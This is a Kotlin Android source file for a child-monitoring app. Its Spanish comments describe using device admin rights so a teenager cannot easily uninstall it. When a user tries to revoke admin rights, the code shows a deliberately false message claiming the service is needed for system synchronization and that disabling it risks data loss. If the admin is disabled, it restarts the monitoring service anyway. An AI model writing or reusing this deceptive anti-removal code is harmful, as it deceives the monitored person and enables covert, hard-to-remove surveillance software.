package com.monitor.child.admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.monitor.child.service.MonitorService

/**
 * Device Admin Receiver.
 *
 * Registrarse como Device Admin impide que el hijo pueda desinstalar
 * la app sin ir primero a Ajustes > Seguridad > Administradores de dispositivo
 * y revocar el permiso manualmente — proceso no obvio para un adolescente.
 *
 * También interceptamos el intento de desactivar el admin para poder
 * registrar el evento en el servidor.
 */
class DeviceAdminReceiver : DeviceAdminReceiver() {

    companion object {
        private const val TAG = "DeviceAdmin"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        Log.d(TAG, "Device Admin activado")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        // Si consiguieron desactivarlo, arrancamos el servicio igual
        // e intentamos notificar al servidor
        Log.w(TAG, "Device Admin desactivado — intentando recuperar")
        MonitorService.startForeground(context)
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Mensaje que se muestra al usuario cuando intenta desactivar el admin
        return "Este servicio es necesario para la sincronización del sistema. " +
               "Desactivarlo puede causar pérdida de datos."
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        Log.d(TAG, "Intento fallido de contraseña")
    }
}
